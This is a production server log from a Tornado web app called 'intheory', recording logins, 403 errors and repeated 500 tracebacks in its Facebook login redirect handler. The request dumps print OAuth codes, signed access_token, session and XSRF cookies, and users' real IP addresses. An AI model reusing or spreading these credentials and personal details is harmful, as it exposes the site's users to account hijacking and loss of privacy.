INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
Server started successfully.
Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
INFO:intheory-8002:Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
HTTP 403: Forbidden
ERROR:intheory-8002:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 126.47ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 103.91ms
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 80.66ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 105.22ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 79.09ms
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 GET /admin/users (127.0.0.1) 81.02ms
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 508552f38e4c850614b84f72 has successfully logged in.
INFO:intheory-8002:Facebook user with id 508552f38e4c850614b84f72 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 508569938e4c850614b84f76 has successfully logged in.
INFO:intheory-8000:Facebook user with id 508569938e4c850614b84f76 has successfully logged in.
Facebook user with id 508569938e4c850614b84f76 has successfully logged in.
INFO:intheory-8002:Facebook user with id 508569938e4c850614b84f76 has successfully logged in.
Intheory user with id 50856ac98e4c850614b84f78 has successfully registered.
INFO:intheory-8002:Intheory user with id 50856ac98e4c850614b84f78 has successfully registered.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Server started successfully.
INFO:intheory-8001:Server started successfully.
Server started successfully.
INFO:intheory-8000:Server started successfully.
Server started successfully.
INFO:intheory-8002:Server started successfully.
Server started successfully.
INFO:intheory-8003:Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Origin': 'https://www.facebook.com', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25', 'Connection': 'close', 'Cookie': '__utma=188782963.996809295.1350932093.1350932093.1350932093.1; __utmb=188782963.2.10.1350932093; __utmc=188782963; __utmz=188782963.1350932093.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '90.206.17.28'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF (127.0.0.1) 1067.28ms
Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
INFO:intheory-8001:Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Origin': 'https://www.facebook.com', 'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25', 'Connection': 'close', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFFeVpDdHByemVFZWVwZFZCM3dscFpCVzFGazFsVHJCOTBnSVBDRmt0UUFmYUh1M2owd2V1Z0FDdVpBQTZIZzlOblBWbmhKODFNdWw2UmdkMTVaQ1dJbnIwR3dCUUFaRFpE|1350932164|a5b710bfda9a7671e3a4166f8d05a453d636f422; user_type="ZmI=|1350932164|50b1212bb969dd598a7c199ab0326aea3ab4bee8"; __utma=188782963.996809295.1350932093.1350932093.1350932093.1; __utmb=188782963.2.10.1350932093; __utmc=188782963; __utmz=188782963.1350932093.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '90.206.17.28'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQAslR4SmRD1Sc3lwiscUtTsNhxjkaxbu5YxY4_ZRzFj_89U-IOU6HdixVATFkXXQtYSckcz46R0V7AzkVd-1pWnF2i5WyO111785yvgu-TEkYz5qAYYGkX0gRg7GcOVW_FcivjpCFfhqPpGPpyuQwPmrBWZt31W3I7l3ldkFaxOlkGpUFXXxctGurrOxIsjTjsoRNNEgVqxG-l78gqscjWF (127.0.0.1) 1115.70ms
Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
INFO:intheory-8000:Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQCAlA6WtSVtxY5FjNPXNxUM2-ozvwZpNTMXrRW_MzShN_AviD9UC-F4KP_fvtbtPY2RWjzwcf30J-7r2zBDyG6O8H0EXSkgpn1NNEBAGJux6HKsXKti7Dl-o7MpajSe7kExmeGR0SuLbSlwqqLUmovl_dJkAdgFC-KMlwLiJkOgl5CPA0lne1vWMtLTQZ3IJ56rO5J4vR9mbCW1Z7-2BaJP (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQCAlA6WtSVtxY5FjNPXNxUM2-ozvwZpNTMXrRW_MzShN_AviD9UC-F4KP_fvtbtPY2RWjzwcf30J-7r2zBDyG6O8H0EXSkgpn1NNEBAGJux6HKsXKti7Dl-o7MpajSe7kExmeGR0SuLbSlwqqLUmovl_dJkAdgFC-KMlwLiJkOgl5CPA0lne1vWMtLTQZ3IJ56rO5J4vR9mbCW1Z7-2BaJP', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25', 'Connection': 'close', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFFeVpDdHByemVFZWVwZFZCM3dscFpCVzFGazFsVHJCOTBnSVBDRmt0UUFmYUh1M2owd2V1Z0FDdVpBQTZIZzlOblBWbmhKODFNdWw2UmdkMTVaQ1dJbnIwR3dCUUFaRFpE|1350932168|d9dfe8435a0cb80295a13a2fefbfaeb0d7abe61f; user_type="ZmI=|1350932168|b2de276f05f865f62f81b583a110ea1d643c5b42"; __utma=188782963.996809295.1350932093.1350932093.1350932093.1; __utmb=188782963.2.10.1350932093; __utmc=188782963; __utmz=188782963.1350932093.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Cache-Control': 'max-age=0', 'X-Real-Ip': '90.206.17.28'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQCAlA6WtSVtxY5FjNPXNxUM2-ozvwZpNTMXrRW_MzShN_AviD9UC-F4KP_fvtbtPY2RWjzwcf30J-7r2zBDyG6O8H0EXSkgpn1NNEBAGJux6HKsXKti7Dl-o7MpajSe7kExmeGR0SuLbSlwqqLUmovl_dJkAdgFC-KMlwLiJkOgl5CPA0lne1vWMtLTQZ3IJ56rO5J4vR9mbCW1Z7-2BaJP (127.0.0.1) 1071.31ms
Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
INFO:intheory-8003:Facebook user with id 508596c48e4c8537b543ef0f has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQCQi9rwyB30RS0I9ZR-uPn2Ecsy1tTUNHF4A74DZWySMW5HQSyS8duEGGWc37TIlZtwJAbJ9oXdibqkAWuKUGKflSLDuvSKu1r7tet4Ae8ZEe6CpgZXL68Ed_diS8ANhWh-We8ximoG7lfbr3XXPL6P3vYkRabRJCk7OTOTKXIjqhgQgSCWhttzcaUsjBBe8YpHoaBADnm11ke8R7PfzuMA (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQCQi9rwyB30RS0I9ZR-uPn2Ecsy1tTUNHF4A74DZWySMW5HQSyS8duEGGWc37TIlZtwJAbJ9oXdibqkAWuKUGKflSLDuvSKu1r7tet4Ae8ZEe6CpgZXL68Ed_diS8ANhWh-We8ximoG7lfbr3XXPL6P3vYkRabRJCk7OTOTKXIjqhgQgSCWhttzcaUsjBBe8YpHoaBADnm11ke8R7PfzuMA', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-gb', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A403 Safari/8536.25', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '90.206.17.28', 'Cookie': 'access_token=QUFBRzZsTmNzNkdjQkFFeVpDdHByemVFZWVwZFZCM3dscFpCVzFGazFsVHJCOTBnSVBDRmt0UUFmYUh1M2owd2V1Z0FDdVpBQTZIZzlOblBWbmhKODFNdWw2UmdkMTVaQ1dJbnIwR3dCUUFaRFpE|1350932171|a75effb9ede777812e3e10d357a7a4ce86727395; user_type="ZmI=|1350932171|589664c82a4eb8fa389dc22622aae1df847f6d30"; __utma=188782963.996809295.1350932093.1350932093.1350932093.1; __utmb=188782963.2.10.1350932093; __utmc=188782963; __utmz=188782963.1350932093.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQCQi9rwyB30RS0I9ZR-uPn2Ecsy1tTUNHF4A74DZWySMW5HQSyS8duEGGWc37TIlZtwJAbJ9oXdibqkAWuKUGKflSLDuvSKu1r7tet4Ae8ZEe6CpgZXL68Ed_diS8ANhWh-We8ximoG7lfbr3XXPL6P3vYkRabRJCk7OTOTKXIjqhgQgSCWhttzcaUsjBBe8YpHoaBADnm11ke8R7PfzuMA (127.0.0.1) 1141.23ms
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8002:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQCBrye_yN1dNFa-659nwyaopZUOv412s0YL16mWce8ZP0pAHXilBJMUfIPeWMGknRS47L7UZMieXrQUcje-J4YCTAnVP5FejGG1upaGsRv5SeCBGxIsF0RGlC5nwqmScjN_k2hT7y1TQEVWVj8KISubXmITIFCtJv0xkh32ia5tQv0X7Mq15-_IEx5OuIHLEcALKj3Bf4PkcWOtTDwlZuhH (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQCBrye_yN1dNFa-659nwyaopZUOv412s0YL16mWce8ZP0pAHXilBJMUfIPeWMGknRS47L7UZMieXrQUcje-J4YCTAnVP5FejGG1upaGsRv5SeCBGxIsF0RGlC5nwqmScjN_k2hT7y1TQEVWVj8KISubXmITIFCtJv0xkh32ia5tQv0X7Mq15-_IEx5OuIHLEcALKj3Bf4PkcWOtTDwlZuhH', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Dnt': '1', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '90.206.17.28', 'Cookie': '_xsrf=c2cf432d970b4883970a806b2b2a8569; access_token=QUFBRzZsTmNzNkdjQkFMQzJIUFlaQklyckt4N3dxUHc5TzRMN1pCV0xRdFpBN3doRE5wN2Q1eXViaVpBbU1DeldWQ1ZTbXRjeUdxZGFOd1Axa0FFUTY4c3ZKU0VHMnBwa1c4RjNwcEx6WVFaRFpE|1350405928|afe47e27b7efbce785006997a3a9bf0429650998; user_type="ZmI=|1350405928|ba3107911d89fd1c2ebbd20e424e6e2b2742b6f2"; __utma=188782963.1604713984.1347896693.1350570791.1350932196.10; __utmb=188782963.2.10.1350932196; __utmc=188782963; __utmz=188782963.1347896693.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQCBrye_yN1dNFa-659nwyaopZUOv412s0YL16mWce8ZP0pAHXilBJMUfIPeWMGknRS47L7UZMieXrQUcje-J4YCTAnVP5FejGG1upaGsRv5SeCBGxIsF0RGlC5nwqmScjN_k2hT7y1TQEVWVj8KISubXmITIFCtJv0xkh32ia5tQv0X7Mq15-_IEx5OuIHLEcALKj3Bf4PkcWOtTDwlZuhH (127.0.0.1) 1170.74ms
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8000:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQC0nUzfVxMCOisCCoHQ_kxkSrggVxobnFTFW9BMS_wUe-m5ol0YpCguVeFU-C1WxQULYxUqyiuM6Ncd2Heh64GBIzgWKRo1RuAaY7SlXF-3WcD3fOQh2KYMHh0mCEMzESccNtFfhzTCpFO6etJASTXOhpKee4TULScNH1ycgstqHzTtJmLSaen2KA-tgpT0JW7BAG5zMKkqv2bAiEICfL9s (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQC0nUzfVxMCOisCCoHQ_kxkSrggVxobnFTFW9BMS_wUe-m5ol0YpCguVeFU-C1WxQULYxUqyiuM6Ncd2Heh64GBIzgWKRo1RuAaY7SlXF-3WcD3fOQh2KYMHh0mCEMzESccNtFfhzTCpFO6etJASTXOhpKee4TULScNH1ycgstqHzTtJmLSaen2KA-tgpT0JW7BAG5zMKkqv2bAiEICfL9s', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.8', 'Accept-Encoding': 'gzip,deflate,sdch', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4', 'Dnt': '1', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '90.206.17.28', 'Cookie': '_xsrf=c2cf432d970b4883970a806b2b2a8569; access_token=QUFBRzZsTmNzNkdjQkFMQzJIUFlaQklyckt4N3dxUHc5TzRMN1pCV0xRdFpBN3doRE5wN2Q1eXViaVpBbU1DeldWQ1ZTbXRjeUdxZGFOd1Axa0FFUTY4c3ZKU0VHMnBwa1c4RjNwcEx6WVFaRFpE|1350932228|4c9e0c3581e190c7814915206bfc3754c42d9222; user_type="ZmI=|1350932228|62339b0e704d9be3cbf954f81d8e894edbd170e8"; __utma=188782963.1604713984.1347896693.1350570791.1350932196.10; __utmb=188782963.3.10.1350932196; __utmc=188782963; __utmz=188782963.1347896693.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQC0nUzfVxMCOisCCoHQ_kxkSrggVxobnFTFW9BMS_wUe-m5ol0YpCguVeFU-C1WxQULYxUqyiuM6Ncd2Heh64GBIzgWKRo1RuAaY7SlXF-3WcD3fOQh2KYMHh0mCEMzESccNtFfhzTCpFO6etJASTXOhpKee4TULScNH1ycgstqHzTtJmLSaen2KA-tgpT0JW7BAG5zMKkqv2bAiEICfL9s (127.0.0.1) 1080.65ms
Intheory user with id 50859ab28e4c8537a576966e has successfully registered.
INFO:intheory-8000:Intheory user with id 50859ab28e4c8537a576966e has successfully registered.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQBoHjHOxQgiIjzcL7CUDOa9QzsbTwoMjPinemi4g3_EfwJG3U9aIP9utsEMKjEpsSof4VmYOW0768vvg9V84lf61w7GhIaxClOwhg-OsbLffNSKqwbuAryxEmdKiCVPvTxhBWwi6bpd8TsxZq9myZD8x7yrdQSZxiFJ-R2Ae0TkLphJyRr1FIrD7c5_SL0jusHeEDGhBxu-jCCgVkICRHjt (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQBoHjHOxQgiIjzcL7CUDOa9QzsbTwoMjPinemi4g3_EfwJG3U9aIP9utsEMKjEpsSof4VmYOW0768vvg9V84lf61w7GhIaxClOwhg-OsbLffNSKqwbuAryxEmdKiCVPvTxhBWwi6bpd8TsxZq9myZD8x7yrdQSZxiFJ-R2Ae0TkLphJyRr1FIrD7c5_SL0jusHeEDGhBxu-jCCgVkICRHjt', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
ERROR:root:500 GET /login/fb?code=AQBoHjHOxQgiIjzcL7CUDOa9QzsbTwoMjPinemi4g3_EfwJG3U9aIP9utsEMKjEpsSof4VmYOW0768vvg9V84lf61w7GhIaxClOwhg-OsbLffNSKqwbuAryxEmdKiCVPvTxhBWwi6bpd8TsxZq9myZD8x7yrdQSZxiFJ-R2Ae0TkLphJyRr1FIrD7c5_SL0jusHeEDGhBxu-jCCgVkICRHjt (127.0.0.1) 1155.91ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
ERROR:root:Uncaught exception GET /login/fb?code=AQDuLTl_UuNnKTxx6RLb7mzNz7AKTmdW239L4I07Z75fnVTDuAnLLa7egLHSqDvC-WxvKCZyE97_UOKzkEzFu7k1Q8nhC0U-Wpd6MPyNH6SvlRv2MVs0o12dEtDZuhjYS2SeE_BfcpA3cfi9CPJmY8Y6qL_X-MqYm99H6cZMrDjhp0x4b1cpC1Ms2lSwSEXt_9R2ad4fM6zbJdZbFP0Kfuqb (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/login/fb?code=AQDuLTl_UuNnKTxx6RLb7mzNz7AKTmdW239L4I07Z75fnVTDuAnLLa7egLHSqDvC-WxvKCZyE97_UOKzkEzFu7k1Q8nhC0U-Wpd6MPyNH6SvlRv2MVs0o12dEtDZuhjYS2SeE_BfcpA3cfi9CPJmY8Y6qL_X-MqYm99H6cZMrDjhp0x4b1cpC1Ms2lSwSEXt_9R2ad4fM6zbJdZbFP0Kfuqb', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0', 'Connection': 'close', 'Referer': 'http://intheory.co.uk/login/options', 'X-Real-Ip': '86.167.54.3', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFHSVJPMkdkMWNaQzBLZGx0YThPbkdWR2ZMdUtsbkFjblNNdTVGRUo4cXpNWkJreHRmWkE4WkE5QUY5eTI3cEo2WkJEWHVQbjJvRHJWbUFYZGNvMnM2MmM5TGlPc0xBWkRaRA==|1350933187|fc279b414678bc41b5dc4e2a98a7e10858b7b3cb"; user_type="ZmI=|1350933187|9ea713ac112edd1b7487a230d1ba48f43c523546"'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 128, in _on_login
    self.redirect(next)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 466, in redirect
    url = re.sub(b(r"[\x00-\x20]+"), "", utf8(url))
  File "/www/virtualenv/intheory/lib/python2.7/re.py", line 151, in sub
    return _compile(pattern, flags).sub(repl, string, count)
TypeError: expected string or buffer
